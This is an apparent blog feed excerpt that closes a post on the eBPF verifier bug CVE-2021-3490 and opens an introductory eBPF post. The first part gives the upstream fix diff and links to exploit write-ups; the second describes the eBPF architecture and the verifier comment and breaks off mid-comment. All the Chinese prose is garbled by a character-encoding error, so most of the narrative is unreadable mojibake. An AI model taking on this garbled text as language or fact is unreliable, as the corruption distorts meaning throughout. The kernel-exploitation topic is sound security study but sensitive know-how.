ï¼ˆ<code>/proc/sys/kernel/panic_on_oops == 0</code>ï¼‰ï¼Œå› æ­¤è¿™ä¸ªæ–¹æ³•çš„å¯è¡Œæ€§å…¶å®è¿˜æ˜¯æŒºé«˜çš„</p><h1 id="0x03-æ¼æ´ä¿®å¤"><a href="#0x03-æ¼æ´ä¿®å¤" class="headerlink" title="0x03. æ¼æ´ä¿®å¤"></a>0x03. æ¼æ´ä¿®å¤</h1><p>åœ¨ <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">è¿™ä¸ª commit</a> ä¸­å®Œæˆäº†å¯¹æ¼æ´çš„ä¿®è¡¥æ“ä½œ,æ¼æ´çš„ä¿®å¤æ–¹å¼ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦å°†ç¼ºå¤±çš„è®¾ç½® 32 ä½è¾¹ç•Œçš„æ“ä½œè¡¥å……ä¸Šå°±è¡Œï¼š</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs diff"><br><span class="hljs-comment">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c</span><br><span class="hljs-comment">index 757476c91c984..9352a1b7de2dd 100644</span><br><span class="hljs-comment">--- a/kernel/bpf/verifier.c</span><br><span class="hljs-comment">+++ b/kernel/bpf/verifier.c</span><br><span class="hljs-meta">@@ -7084,11 +7084,10 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umax_val = src_reg-&gt;u32_max_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_and will be called so its safe</span><br><span class="hljs-deletion">- * to skip updating register for known 32-bit case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our minimum from the var_off, since that&#x27;s inherently<br>  * bitwise.  Our maximum is the minimum of the operands&#x27; maxima.<br><span class="hljs-meta">@@ -7108,7 +7107,6 @@</span> static void scalar32_min_max_and(struct bpf_reg_state *dst_reg,<br> dst_reg-&gt;s32_min_value = dst_reg-&gt;u32_min_value;<br> dst_reg-&gt;s32_max_value = dst_reg-&gt;u32_max_value;<br> &#125;<br><span class="hljs-deletion">-</span><br> &#125;<br> <br> static void scalar_min_max_and(struct bpf_reg_state *dst_reg,<br><span class="hljs-meta">@@ -7155,11 +7153,10 @@</span> static void scalar32_min_max_or(struct bpf_reg_state *dst_reg,<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> u32 umin_val = src_reg-&gt;u32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_or will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get our maximum from the var_off, and our minimum is the<br>  * maximum of the operands&#x27; minima<br><span class="hljs-meta">@@ -7224,11 +7221,10 @@</span> static void scalar32_min_max_xor(struct bpf_reg_state *dst_reg,<br> struct tnum var32_off = tnum_subreg(dst_reg-&gt;var_off);<br> s32 smin_val = src_reg-&gt;s32_min_value;<br> <br><span class="hljs-deletion">-/* Assuming scalar64_min_max_xor will be called so it is safe</span><br><span class="hljs-deletion">- * to skip updating register for known case.</span><br><span class="hljs-deletion">- */</span><br><span class="hljs-deletion">-if (src_known &amp;&amp; dst_known)</span><br><span class="hljs-addition">+if (src_known &amp;&amp; dst_known) &#123;</span><br><span class="hljs-addition">+__mark_reg32_known(dst_reg, var32_off.value);</span><br> return;<br><span class="hljs-addition">+&#125;</span><br> <br> /* We get both minimum and maximum from the var32_off. */<br> dst_reg-&gt;u32_min_value = var32_off.value;<br></code></pre></td></tr></table></figure><p>ç¬”è€…è®¤ä¸ºè¿™ä¸ªä¿®è¡¥æ–¹å¼è¿˜æ˜¯æ¯”è¾ƒæˆåŠŸçš„</p><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF. REFERENCE"></a>0xFF. REFERENCE</h1><p><a href="https://bsauce.github.io/2021/08/31/CVE-2021-3490">ã€kernel exploitã€‘CVE-2021-3490 eBPF 32ä½è¾¹ç•Œè®¡ç®—é”™è¯¯æ¼æ´</a></p><p><a href="https://xz.aliyun.com/t/11165">eBPFæ¼æ´CVE-2021-3490åˆ†æä¸åˆ©ç”¨</a></p><p><a href="https://a1ex.online/2021/08/16/ebpf-pwn-A-Love-Story/">ebpf-pwn-A-Love-Story</a></p><p><a href="https://cjovi.icu/WP/1604.html">D^3CTF2022-d3bpf,d3bpf-v2-WP</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é‚£ä¸€å¤©ï¼Œa3 ç»ˆäºå›æƒ³èµ·äº†è¢« VM Pwn æ”¯é…çš„ææ€–&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://arttnba3.github.io/categories/CVE/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="CVE" scheme="https://arttnba3.github.io/tags/CVE/"/>
    
    <category term="ææƒ" scheme="https://arttnba3.github.io/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="eBPF" scheme="https://arttnba3.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>ã€EBPF.0x00ã€‘eBPF å…¥é—¨æŒ‡åŒ—ï¼ˆä¸€ï¼‰ï¼šç®€ä»‹</title>
    <link href="https://arttnba3.github.io/2023/05/31/EBPF_0X00/"/>
    <id>https://arttnba3.github.io/2023/05/31/EBPF_0X00/</id>
    <published>2023-05-30T19:46:24.000Z</published>
    <updated>2023-06-06T21:37:07.000Z</updated>
    
    <content type="html"><![CDATA[<p>BEE BEE Iâ€™M A SHEEP</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>å› ä¸ºæœ€è¿‘æ¯•è®¾æå¾—æœ‰ç‚¹å¤´å¤§ï¼ˆâ†å› ä¸ºè¿™ä¸ªäººå„ç§æ‘¸é±¼å¯¼è‡´è¿›åº¦å·®çš„å¤ªå¤šç„¶åæœ€åå‡ å¤©ç–¯ç‹‚å„ç§èµ¶å·¥ï¼‰ï¼Œæ‰€ä»¥çœ‹ç‚¹å’Œæ¯•è®¾æ— å…³çš„ä¸œè¥¿ï¼ˆè¿™æ ·æ¯•è®¾ä¸æ˜¯æ›´åŠ åšä¸å®Œäº†å˜›ï¼ˆæ‚²ï¼‰</p></blockquote><p>ç¬”è€…ä¸€ç›´æƒ³ç€æœ‰æœºä¼šæ·±å…¥å­¦ä¹ ä¸€ä¸‹ eBPF ç›¸å…³çš„ä¸œè¥¿ï¼Œå¯æƒœæ€»æ˜¯ä¹ æƒ¯æ€§ä¸€å¤´æ‰è¿›æºç å„ç§ç¹æ‚çš„ç»†èŠ‚å½“ä¸­è¿·å¤±è‡ªå·±ç„¶åæ”¾å¼ƒï¼ˆæ‚²ï¼‰</p><p><del>äºæ˜¯è¶ç°åœ¨æœ‰æ—¶é—´ï¼ˆï¼Ÿï¼‰</del> è™½ç„¶ç°åœ¨æ²¡ä»€ä¹ˆæ—¶é—´ï¼Œç¬”è€…è¿˜æ˜¯æƒ³ç»™è¿™ç©æ„å…ˆå¼€ä¸ªå¤´å†™ç¬¬ä¸€ç¯‡åšå®¢ï¼Œæ¯•ç«Ÿåªè¦å¼€äº†ä¸€ä¸ªå¤´ä¹‹ååé¢çš„äº‹æƒ…ä¹Ÿå°±ä¼šç®€å•å¾—å¤šäº†å§ï¼ˆå¤§å˜˜ï¼‰</p><h2 id="What-is-eBPF"><a href="#What-is-eBPF" class="headerlink" title="What is eBPF?"></a>What is eBPF?</h2><p><strong>ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤å™¨</strong>ï¼ˆBerkeley Packet Filterï¼‰æ˜¯ä¸€ä¸ª Linux kernel ä¸­ç”¨ä»¥å¯¹æ¥è‡ªäºé“¾è·¯å±‚çš„æ•°æ®åŒ…è¿›è¡Œè¿‡æ»¤çš„æ¶æ„ï¼Œå…¶ä½äºå†…æ ¸ä¸­çš„æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/07/21/Cpf7VY9z5lsG2u3.png" alt="image.png"></p><p>ç›¸æ¯”èµ·ä¼ ç»Ÿçš„æ•°æ®åŒ…è¿‡æ»¤å™¨è€Œè¨€ï¼ŒBPF <strong>åœ¨å†…æ ¸ä¸­</strong>å®ç°äº†ä¸€ä¸ªæ–°çš„<strong>è™šæ‹Ÿæœº</strong>è®¾è®¡ï¼Œé€šè¿‡<strong>å³æ—¶ç¼–è¯‘</strong>ï¼ˆJust-In-Time compilationï¼‰æŠ€æœ¯å°† BPF æŒ‡ä»¤ç¿»è¯‘ä¸º BPF è™šæ‹Ÿæœºçš„å­—èŠ‚ç ï¼Œå¯ä»¥é«˜æ•ˆåœ°å·¥ä½œåœ¨åŸºäºå¯„å­˜å™¨ç»“æ„çš„ CPU ä¸Š</p><p>Linux kernel è‡ª 3.18 ç‰ˆæœ¬èµ·æä¾›äº†<strong>æ‰©å±•ä¼¯å…‹åˆ©åŒ…è¿‡æ»¤å™¨</strong>ï¼ˆ<strong>e</strong>xtended <strong>BPF</strong>ï¼Œå³ <code>eBPF</code>ï¼‰ï¼Œå…¶åº”ç”¨èŒƒå›´æ›´å¹¿ï¼Œèƒ½å¤Ÿè¢«åº”ç”¨äºæ›´å¤šçš„åœºæ™¯ï¼ŒåŸæ¥çš„ BPF è¢«ç§°ä¸º <strong>c</strong>lassic <strong>BPF</strong>ï¼ˆcBPFï¼‰ï¼Œä¸”ç›®å‰åŸºæœ¬ä¸Šå·²ç»è¢«åºŸå¼ƒï¼ŒLinux ä¼šå°† cBPF å­—èŠ‚ç è½¬åŒ–ä¸º eBPF å­—èŠ‚ç å†æ‰§è¡Œ</p><p>ä½œä¸ºä¸€ä¸ª<strong>ä½äºå†…æ ¸å±‚é¢çš„è™šæ‹Ÿæœº</strong>ï¼ŒeBPF æ— ç–‘ä¸ºæ”»å‡»è€…æä¾›äº†ä¸€ä¸ªç›¸å½“å¤§çš„æ–°æ”»å‡»é¢ï¼Œå› æ­¤ä¹Ÿæˆä¸ºè¿‘å‡ å¹´å†…æ ¸åˆ©ç”¨ä¸­çš„â€œå¤§çƒ­é—¨â€ï¼Œæœ¬ç¯‡åšå®¢ä¸­ç¬”è€…å°†ç®€è¿° eBPF çš„åŸºæœ¬åŸç†</p><blockquote><p>æœ¬ç¯‡æ–‡ç« ä¸­æ¶‰åŠåˆ°çš„ Linux kernel æºç æ¥è‡ªç‰ˆæœ¬ 6.3.2</p></blockquote><h1 id="0x01-eBPF-çš„åŸºæœ¬æ¶æ„"><a href="#0x01-eBPF-çš„åŸºæœ¬æ¶æ„" class="headerlink" title="0x01.eBPF çš„åŸºæœ¬æ¶æ„"></a>0x01.eBPF çš„åŸºæœ¬æ¶æ„</h1><h2 id="ä¸€ã€eBPF-çš„è¿è¡Œè¿‡ç¨‹"><a href="#ä¸€ã€eBPF-çš„è¿è¡Œè¿‡ç¨‹" class="headerlink" title="ä¸€ã€eBPF çš„è¿è¡Œè¿‡ç¨‹"></a>ä¸€ã€eBPF çš„è¿è¡Œè¿‡ç¨‹</h2><p>Linux ä¸‹ eBPF çš„æ•´ä½“æ¶æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://s2.loli.net/2022/03/20/HfExF3JwKX9nOvi.png" alt="image.png"></p><ul><li>ç”¨æˆ·è¿›ç¨‹é¦–å…ˆåœ¨ç”¨æˆ·ç©ºé—´ç¼–å†™ç›¸åº”çš„ BPF å­—èŠ‚ç ç¨‹åºï¼Œä¼ å…¥å†…æ ¸</li><li>å†…æ ¸é€šè¿‡ <code>verifier</code> å¯¹å­—èŠ‚ç ç¨‹åºè¿›è¡Œå®‰å…¨æ€§æ£€æŸ¥ï¼Œé€šè¿‡æ£€æŸ¥åä¾¿é€šè¿‡ JIT ç¼–è¯‘è¿è¡Œï¼ŒeBPF ç¨‹åºä¸»è¦åˆ†ä¸ºå¦‚ä¸‹ç±»å‹ï¼š<ul><li><code>kprobes</code> ï¼šå†…æ ¸ä¸­çš„åŠ¨æ€è·Ÿè¸ªï¼Œå¯ä»¥è·Ÿè¸ªè‡³å†…æ ¸ä¸­çš„å‡½æ•°å…¥å£æˆ–è¿”å›ç‚¹</li><li><code>uprobes</code> ï¼šç”¨æˆ·ç©ºé—´ä¸­çš„åŠ¨æ€è·Ÿè¸ªï¼Œä¸ kprobes ä¸åŒçš„æ˜¯è·Ÿè¸ªçš„å‡½æ•°ä½äºç”¨æˆ·ç¨‹åºä¸­</li><li><code>tracepoints</code> ï¼šå†…æ ¸ä¸­çš„é™æ€è·Ÿè¸ª</li><li><code>perf_events</code> ï¼šå®šæ—¶é‡‡æ ·ä¸ PMC</li></ul></li><li>æ˜ å°„ï¼ˆmapï¼‰ä½œä¸ºç”¨ä»¥ä¿å­˜æ•°æ®çš„é€šç”¨ç»“æ„ï¼Œå¯ä»¥åœ¨ä¸åŒçš„ eBPF ç¨‹åºä¹‹é—´æˆ–æ˜¯ç”¨æˆ·è¿›ç¨‹ä¸å†…æ ¸é—´å…±äº«æ•°æ®</li></ul><blockquote><p>ä¸åŒç‰ˆæœ¬çš„ eBPF æ‰€æ”¯æŒçš„åŠŸèƒ½æ˜¯ä¸åŒçš„ï¼Œå‚è§<a href="https://github.com/iovisor/bcc/blob/master/docs/kernel-versions.md">è¿™â†‘é‡Œâ†“</a></p><table><thead><tr><th>version</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>4.1</td><td>kprobe support</td></tr><tr><td>4.4</td><td>Perf events</td></tr><tr><td>4.7</td><td>Tracepoints support</td></tr><tr><td>4.8</td><td>XDP core</td></tr><tr><td>4.10</td><td>cgroups support</td></tr></tbody></table></blockquote><p>ä¸€ä¸ª eBPF ç¨‹åºå¯ä»¥è¢«æŒ‚è½½åˆ°å¤šä¸ªäº‹ä»¶ä¸Šï¼Œä¸åŒçš„ eBPF ç¨‹åºä¹‹é—´å¯ä»¥å…±äº«åŒä¸€ä¸ªæ˜ å°„</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">tracing     tracing    tracing    packet      packet     packet<br>event A     event B    event C    on eth0     on eth1    on eth2<br> |<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           </span>|<span class="hljs-string">          ^</span><br><span class="hljs-string"> </span>|<span class="hljs-string">             </span>|<span class="hljs-string">         </span>|<span class="hljs-string">          </span>|<span class="hljs-string">           v          </span>|<br> --&gt; tracing <span class="hljs-variable">&lt;--     tracing      socket    tc ingress   tc egress</span><br><span class="hljs-variable">      prog_1          prog_2      prog_3    classifier    action</span><br><span class="hljs-variable">      |  |              |           |         prog_4      prog_5</span><br><span class="hljs-variable">   |---  -----|  |------|          map_3        |           |</span><br><span class="hljs-variable"> map_1       map_2                              --| map_4 |--</span><br></code></pre></td></tr></table></figure><h2 id="äºŒã€eBPF-verifier"><a href="#äºŒã€eBPF-verifier" class="headerlink" title="äºŒã€eBPF verifier"></a>äºŒã€eBPF verifier</h2><p>åœ¨ eBPF å­—èŠ‚ç è¢«ä¼ å…¥åˆ°å†…æ ¸ç©ºé—´åï¼Œå…¶é¦–å…ˆéœ€è¦ç»è¿‡ <code>verifier</code> çš„å®‰å…¨æ£€æŸ¥ï¼Œä¹‹åæ‰èƒ½è¿›è¡Œ JIT ç¼–è¯‘ï¼Œverifier ä¸»è¦æ£€æŸ¥ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li>æ²¡æœ‰å›å‘è¾¹ï¼ˆback edgeï¼‰ã€ç¯è·¯ï¼ˆloopï¼‰ã€ä¸å¯è¾¾ï¼ˆunreachableï¼‰æŒ‡ä»¤</li><li>ä¸èƒ½åœ¨æŒ‡é’ˆä¹‹é—´è¿›è¡Œæ¯”è¾ƒï¼ŒæŒ‡é’ˆåªèƒ½ä¸æ ‡é‡è¿›è¡ŒåŠ å‡ï¼ˆeBPF ä¸­çš„æ ‡é‡å€¼ä¸ºä¸ä»æŒ‡é’ˆæ´¾ç”Ÿçš„å€¼ï¼‰ï¼Œverifier ä¼šè¿½è¸ªå“ªäº›å¯„å­˜å™¨åŒ…å«æŒ‡é’ˆã€å“ªäº›å¯„å­˜å™¨åŒ…å«æ ‡é‡å€¼</li><li>æŒ‡é’ˆè¿ç®—ä¸èƒ½ç¦»å¼€ä¸€ä¸ª map çš„â€œå®‰å…¨â€è¾¹ç•Œï¼Œè¿™æ„å‘³ç€ç¨‹åºä¸èƒ½è®¿é—®é¢„å®šä¹‰çš„ map å¤–çš„å†…å­˜ï¼Œverifier é€šè¿‡è¿½è¸ªæ¯ä¸ªå¯„å­˜å™¨å€¼çš„ä¸Šç•Œä¸ä¸‹ç•Œ</li><li>ä¸èƒ½å°†æŒ‡é’ˆå­˜å‚¨åœ¨ map ä¸­æˆ–ä½œä¸ºè¿”å›å€¼ï¼Œä»¥é¿å…å°†å†…æ ¸åœ°å€æ³„éœ²åˆ°ç”¨æˆ·ç©ºé—´</li></ul><p>åœ¨ <code>kernel/bpf/verifier.c</code>  å¼€å¤´æ³¨é‡Šé˜è¿°å¦‚ä¸‹ï¼š</p><blockquote><p>è¿™é‡Œä¸ºäº†æ–¹ä¾¿é˜…è¯»ï¼Œæœ‰çš„ä¿ç•™åŸæ–‡æ²¡æœ‰ç¿»è¯‘</p><blockquote><p>æ¯”å¦‚è¯´ç›´æ¥è¯´ <code>map element key</code> ä½ è‚¯å®šçŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½†æ˜¯æˆ‘è¦æ˜¯è¯´ <code>æ˜ å°„å…ƒç´ é”®</code> é‚£ä½ è‚¯å®šå¾—æ¥ä¸€ä¼šâ€¦.</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* bpf_check() æ˜¯ä¸€ä¸ªé™æ€ä»£ç åˆ†æå™¨ï¼Œå…¶é€æ¡éå† eBPF ç¨‹åºä¸­çš„æŒ‡ä»¤ï¼Œ</span><br><span class="hljs-comment"> * å¹¶æ›´æ–°å¯„å­˜å™¨/å †æ ˆçš„çŠ¶æ€ã€‚</span><br><span class="hljs-comment"> * æ¡ä»¶åˆ†æ”¯çš„æ‰€æœ‰è·¯å¾„éƒ½ä¼šè¢«åˆ†æï¼Œç›´åˆ° &#x27;bpf_exit&#x27; æŒ‡ä»¤ã€‚</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * é¦–å…ˆé€šè¿‡æ·±åº¦ä¼˜å…ˆæœç´¢æ£€æŸ¥ç¨‹åºæ˜¯å¦ä¸ºæœ‰å‘æ— ç¯å›¾ï¼ˆDirected Acyclic Graphï¼‰</span><br><span class="hljs-comment"> * å…¶æ‹’ç»ä»¥ä¸‹ç¨‹åº:</span><br><span class="hljs-comment"> * - æŒ‡ä»¤æ•°å¤§äº BPF_MAXINSNS </span><br><span class="hljs-comment"> * - å‡ºç°äº†å¾ªç¯ (é€šè¿‡åå‘è¾¹æ£€æµ‹)</span><br><span class="hljs-comment"> * - å­˜åœ¨ä¸å¯è¾¾æŒ‡ä»¤ (ä¸åº”å½“æ˜¯ä¸€ä¸ªæ£®æ—. ç¨‹åº = ä¸€ä¸ªå‡½æ•°)</span><br><span class="hljs-comment"> * - è¶Šç•Œæˆ–ç•¸å½¢è·³è½¬</span><br><span class="hljs-comment"> * æ¥ç€æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤å±•å¼€çš„æ‰€æœ‰å¯èƒ½è·¯å¾„ã€‚</span><br><span class="hljs-comment"> * ç”±äºå…¶åˆ†æç¨‹åºä¸­æ‰€æœ‰çš„è·¯å¾„ï¼Œåˆ†æçš„é•¿åº¦è¢«é™åˆ¶ä¸º 64k æŒ‡ä»¤ï¼Œ</span><br><span class="hljs-comment"> * å³ä½¿æ€»çš„æŒ‡ä»¤æ•°ä»…æœ‰ 4k å¯ä¹Ÿèƒ½è¾¾åˆ°ï¼Œä½†è¿™æœ‰å¤ªå¤šçš„ä¼šæ”¹å˜æ ˆ/å¯„å­˜å™¨çš„åˆ†æ”¯ã€‚</span><br><span class="hljs-comment"> * â€œè¢«åˆ†æçš„åˆ†æ”¯â€çš„æ•°é‡è¢«é™åˆ¶åœ¨ 1k</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨æ¯æ¡æŒ‡ä»¤çš„å…¥å£ï¼Œæ¯ä¸ªå¯„å­˜å™¨éƒ½æœ‰ä¸€ä¸ªç±»å‹ï¼Œè¯¥æŒ‡ä»¤æ ¹æ®æŒ‡ä»¤è¯­ä¹‰æ”¹å˜å¯„å­˜å™¨çš„ç±»å‹ã€‚</span><br><span class="hljs-comment"> * è‹¥æŒ‡ä»¤ä¸º BPF_MOV64_REG(BPF_REG_1, BPF_REG_5),  åˆ™ R5 çš„ç±»å‹ä¼šè¢«å¤åˆ¶ç»™ R1</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * æ‰€æœ‰çš„å¯„å­˜å™¨éƒ½æ˜¯ 64 ä½çš„</span><br><span class="hljs-comment"> * R0 - è¿”å›å¯„å­˜å™¨</span><br><span class="hljs-comment"> * R1-R5 ä¼ å‚å¯„å­˜å™¨</span><br><span class="hljs-comment"> * R6-R9 callee ä¿å­˜çš„å¯„å­˜å™¨</span><br><span class="hljs-comment"> * R10 - åªè¯»å¸§æŒ‡é’ˆ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * åœ¨ BPF ç¨‹åºèµ·å§‹ï¼Œ R1 å¯„å­˜å™¨åŒ…å«ä¸€ä¸ªæŒ‡å‘ bpf_context çš„æŒ‡é’ˆï¼Œ</span><br><span class="hljs-comment"> * å…¶ç±»å‹ä¸º PTR_TO_CTX.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * Verifier è·Ÿè¸ªæŒ‡é’ˆä¸Šçš„è¿ç®—ï¼Œä»¥å…:</span><br><span class="hljs-comment"> *    BPF_MOV64_REG(BPF_REG_1, BPF_REG_10),</span><br><span class="hljs-comment"> *    BPF_ALU64_IMM(BPF_ADD, BPF_REG_1, -20),</span><br><span class="hljs-comment"> * ç¬¬ä¸€æ¡æŒ‡ä»¤å°† R10 (FRAME_PTR) çš„ç±»å‹æ‹·è´ç»™ R1ï¼Œ</span><br><span class="hljs-comment"> * ç¬¬äºŒæ¡ç®—æœ¯æŒ‡ä»¤é€šè¿‡æ¨¡å¼åŒ¹é…ä»¥è¯†åˆ«å…¶æƒ³è¦æ„é€ ä¸€ä¸ªæŒ‡å‘æ ˆå†…å…ƒç´ çš„æŒ‡é’ˆã€‚</span><br><span class="hljs-comment"> * å› æ­¤åœ¨ç¬¬äºŒæ¡æŒ‡ä»¤åï¼Œå¯„å­˜å™¨ R1 çš„ç±»å‹ä¸º PTR_TO_STACK</span><br><span class="hljs-comment"> * (ä»¥åŠå¸¸é‡ -20 è¢«å­˜å‚¨ç”¨ä½œæœªæ¥çš„æ ˆè¾¹ç•Œæ£€æŸ¥).</span><br><span class="hljs-comment"> * è¿™æ„å‘³ç€è¯¥å¯„å­˜å™¨ä¸ºä¸€ä¸ªæŒ‡å‘[æ ˆ + å·²çŸ¥ç«‹å³æ•°å¸¸é‡]çš„æŒ‡é’ˆ</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å¤§éƒ¨åˆ†æƒ…å†µä¸‹å¯„å­˜å™¨éƒ½æœ‰ç€ SCALAR_VALUE ç±»å‹ï¼Œ</span><br><span class="hljs-comment"> * è¿™æ„å‘³ç€å¯„å­˜å™¨å­˜å‚¨ç€ä¸€äº›å€¼ï¼Œä½†å¹¶éä¸€ä¸ªå¯ç”¨çš„æŒ‡é’ˆ.</span><br><span class="hljs-comment"> * (ä¾‹å¦‚æŒ‡é’ˆåŠ ä¸ŠæŒ‡é’ˆä¼šå˜ä¸º SCALAR_VALUE ç±»å‹)</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * å½“ verifier é‡åˆ° load æˆ– store æŒ‡ä»¤æ—¶åŸºå¯„å­˜å™¨ï¼ˆbase registerï¼‰çš„ç±»å‹å¯ä»¥ä¸ºï¼š</span><br><span class="hljs-comment"> * PTR_TO_MAP_VALUE, PTR_TO_CTX, PTR_TO_STACK, PTR_TO_SOCKET.</span><br><span class="hljs-comment"> * è¿™äº›æ˜¯ 4 ç§è¢« check_mem_access() å‡½æ•°æ‰€è¯†åˆ«çš„æŒ‡é’ˆç±»å‹.</span><br><span class="hljs-comment"> *</span><br><span 